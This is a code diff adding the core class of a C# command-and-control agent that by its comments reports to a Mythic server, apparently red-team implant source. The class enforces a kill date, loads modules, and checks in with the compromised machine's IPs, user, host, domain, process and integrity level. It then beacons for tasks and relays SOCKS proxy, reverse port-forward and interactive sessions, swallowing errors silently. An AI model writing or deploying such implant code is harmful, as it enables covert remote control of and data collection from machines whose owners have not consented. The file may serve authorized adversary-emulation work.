@@ -1,0 +1,193 @@
+﻿using Agent.Interfaces;
+using Agent.Models;
+using Agent.Utilities;
+using Autofac;
+using System.Diagnostics;
+using System.Net;
+using System.Net.NetworkInformation;
+
+namespace Agent
+{
+    public class AthenaCore : IAgent
+    {
+        private IAgentConfig config { get; set; }
+        private IEnumerable<IProfile> profiles { get; set; }
+        private IEnumerable<IAgentMod> mods { get; set; }   
+        private ILogger logger { get; set; }
+        private ITaskManager taskManager { get; set; }
+        private ITokenManager tokenManager { get; set; }
+        private IProfile _profile;
+
+        //Will need ISocksManager, IRpfwdManager, IForwarderManager
+        public AthenaCore(IEnumerable<IProfile> profiles, ITaskManager taskManager, ILogger logger, IAgentConfig config, ITokenManager tokenManager, IEnumerable<IAgentMod> mods)
+        {
+            this.profiles = profiles;
+            this.taskManager = taskManager;
+            this.logger = logger;
+            this.config = config;
+            this.tokenManager = tokenManager;
+            this.mods = mods;
+
+            _profile = SelectProfile(99);
+            _profile.SetTaskingReceived += OnTaskingReceived;
+        }
+        public async Task Start()
+        {
+            try
+            {
+                if (!this.CheckKillDate())
+                {
+                    Environment.Exit(0);
+                }
+
+                await this.ApplyMods();
+                await this.CheckIn();
+                await this._profile.StartBeacon();
+            }
+            catch(Exception e)
+            {
+            }
+        }
+
+        private async Task ApplyMods()
+        {
+            if (this.mods == null)
+            {
+                return;
+            }
+
+
+            foreach (var mod in mods)
+            {
+                try
+                {
+                    await mod.Go();
+                }
+                catch
+                {
+
+                }
+            }
+        }
+
+        private IProfile SelectProfile(int index)
+        {
+            if (index == 99) //Default Value
+            {
+                Random random = new Random();
+
+                return profiles.ElementAt(random.Next(profiles.Count()));
+            }
+
+            return profiles.ElementAt(index);
+        }
+
+        /// <summary>
+        /// Performa  check-in with the Mythic server
+        /// </summary>
+        public async Task<bool> CheckIn()
+        {
+            Checkin ct = new Checkin()
+            {
+                action = "checkin",
+                ips = this.GetIPAddresses(),
+                os = Environment.OSVersion.ToString(),
+                user = Environment.UserName,
+                host = Dns.GetHostName(),
+                pid = Process.GetCurrentProcess().Id,
+                uuid = this.config.uuid,
+                architecture = Misc.GetArch(),
+                domain = Environment.UserDomainName,
+                integrity_level = tokenManager.getIntegrity(),
+                process_name = Process.GetCurrentProcess().ProcessName
+            };
+
+            try
+            {
+                CheckinResponse res = await _profile.Checkin(ct);
+
+                if (res is null || res.status != "success")
+                {
+                    return false;
+                }
+
+                this.updateAgentInfo(res);
+
+                return true;
+
+            }
+            catch
+            {
+                return false;
+            }
+        }
+
+        /// <summary>
+        /// Update the agent information on successful checkin with the Mythic server
+        /// </summary>
+        /// <param name="res">CheckIn Response</param>
+        private void updateAgentInfo(CheckinResponse res)
+        {
+            this.config.uuid = res.id;
+        }
+
+        private List<string> GetIPAddresses()
+        {
+            List<string> ipAddresses = new List<string>();
+            var netInterface = NetworkInterface.GetAllNetworkInterfaces();
+
+            foreach(var netInf in netInterface)
+            {
+                foreach (var ipProp in netInf.GetIPProperties().UnicastAddresses){
+                    ipAddresses.Add(ipProp.Address.ToString());
+                }
+            }
+            return ipAddresses;
+        }
+
+        private async void OnTaskingReceived(object sender, TaskingReceivedArgs args)
+        {
+            //TODO: Try this
+            //Task proxyTask, socksTask, rpfwdTask, delegatesTask;
+            if(args.tasking_response is null)
+            {
+                return;
+            }
+
+            _ = this.taskManager.HandleProxyResponses("socks", args.tasking_response.socks);
+
+            if (args.tasking_response.rpfwd is not null)
+            {
+                _ =this.taskManager.HandleProxyResponses("rportfwd", args.tasking_response.rpfwd);
+            }
+
+            if (args.tasking_response.tasks is not null)
+            {
+                Parallel.ForEach(args.tasking_response.tasks, async task =>
+                {
+                    _ = this.taskManager.StartTaskAsync(new ServerJob(task));
+                });
+            }
+
+            if (args.tasking_response.delegates is not null)
+            {
+                _ = this.taskManager.HandleDelegateResponses(args.tasking_response.delegates);
+            }
+
+            if(args.tasking_response.responses is not null)
+            {
+                _ = this.taskManager.HandleServerResponses(args.tasking_response.responses);
+            }
+
+            if(args.tasking_response.interactive is not null)
+            {
+                _ = this.taskManager.HandleInteractiveResponses(args.tasking_response.interactive);
+            }
+        }
+        //Is this correct?
+        private bool CheckKillDate()
+        {
+            return this.config.killDate > DateTime.Now;
+        }
+    }
+}
